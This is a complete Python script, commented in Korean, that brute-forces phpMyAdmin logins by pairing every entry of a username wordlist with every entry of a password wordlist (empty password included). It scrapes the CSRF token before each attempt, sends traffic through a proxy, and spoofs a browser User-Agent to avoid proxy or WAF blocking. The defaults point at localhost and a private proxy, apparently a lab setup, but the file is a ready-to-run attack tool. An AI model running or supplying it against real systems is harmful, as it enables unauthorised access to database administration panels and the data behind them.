#!/usr/bin/env python3
"""
phpMyAdmin 브루트포스 스크립트 (사용자명 x 비밀번호 교차 탐색)

============================================================
  설정 (Configuration) - 여기 값을 먼저 채워넣고 실행하세요
============================================================
"""

# --- 대상 설정 ---
TARGET_URL = "http://127.0.0.1:8080/phpmyadmin/index.php"

# --- 워드리스트 설정 (두 개 필요: 사용자명용 / 비밀번호용) ---
USER_WORDLIST = "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
PASS_WORDLIST = "/usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt"

# --- 프록시 설정 (사용하지 않으려면 빈 문자열 "" 로 설정) ---
PROXY = "http://192.168.199.189:3128"

# --- 고급 설정 (보통은 기본값 그대로 두면 됩니다) ---
# User-Agent: phpMyAdmin 자체는 검사하지 않지만, Squid 프록시/WAF가
# 기본 python-requests UA를 차단할 수 있어 브라우저처럼 보이게 설정합니다.
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
# 요청 타임아웃(초). 네트워크가 느리면 늘리세요.
REQUEST_TIMEOUT_SEC = 10
# ============================================================

"""
사용 예시:
  1. 위 설정값을 채운 뒤 기본 실행:
     python3 brute_pma.py

  2. 커맨드라인 인자로 덮어쓰기 (선택):
     python3 brute_pma.py <url> <users_wordlist> <passwords_wordlist> [proxy]
"""

import sys

import requests


def load_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]

    except FileNotFoundError:
        print(f"[-] 워드리스트 파일을 찾을 수 없습니다: {path}")
        return None


def brute_force(url, users, passwords, proxy):
    session = requests.Session()
    if USER_AGENT:
        session.headers.update({"User-Agent": USER_AGENT})
    proxies = {"http": proxy, "https": proxy} if proxy else {}

    total = len(users) * (len(passwords) + 1)  # +1: 빈 비밀번호 포함
    print(f"[*] Target: {url}")
    print(
        f"[*] Users: {len(users)} | Passwords: {len(passwords)} | Total combos: {total}"
    )
    print(f"[*] Proxy: {proxy if proxy else '(none)'}")

    count = 0
    for user in users:
        # 빈 비밀번호를 포함한 교차 탐색
        for pw in [""] + passwords:
            count += 1
            try:
                # 1. GET: 세션 쿠키 및 CSRF 토큰(token) 획득
                res_get = session.get(url, proxies=proxies, timeout=REQUEST_TIMEOUT_SEC)
                token = (
                    res_get.text.split('name="token"')[1]
                    .split('value="')[1]
                    .split('"')[0]
                )

                # 2. POST: 획득한 토큰과 함께 로그인 요청
                data = {
                    "pma_username": user,
                    "pma_password": pw,
                    "token": token,
                    "server": "1",
                }
                res_post = session.post(
                    url,
                    data=data,
                    proxies=proxies,
                    allow_redirects=False,
                    timeout=REQUEST_TIMEOUT_SEC,
                )

                display_pw = "<EMPTY>" if pw == "" else pw

                # 3. 결과 판별 (302 리다이렉트 발생 시 성공 가능성 높음)
                if res_post.status_code in (301, 302, 303, 307):
                    print(f"\n[+] SUCCESS! User: '{user}' | Password: '{display_pw}'")
                    return True

                print(
                    f"[-] [{count}/{total}] Failed: '{user}' / '{display_pw}'",
                    end="\r",
                )

            except (requests.RequestException, ValueError, IndexError, AttributeError, OSError) as e:
                print(f"\n[!] Error at user '{user}', password '{pw}': {e}")
                session = requests.Session()  # 에러 시 세션 리셋
                if USER_AGENT:
                    session.headers.update({"User-Agent": USER_AGENT})

    print("\n[-] No credentials found.")
    return False


if __name__ == "__main__":
    # 커맨드라인 인자가 있으면 설정값을 덮어씁니다.
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    users_path = sys.argv[2] if len(sys.argv) > 2 else USER_WORDLIST
    passwords_path = sys.argv[3] if len(sys.argv) > 3 else PASS_WORDLIST
    proxy = sys.argv[4] if len(sys.argv) > 4 else PROXY

    users = load_wordlist(users_path)
    passwords = load_wordlist(passwords_path)
    if users is None or passwords is None:
        sys.exit(1)

    brute_force(url, users, passwords, proxy)
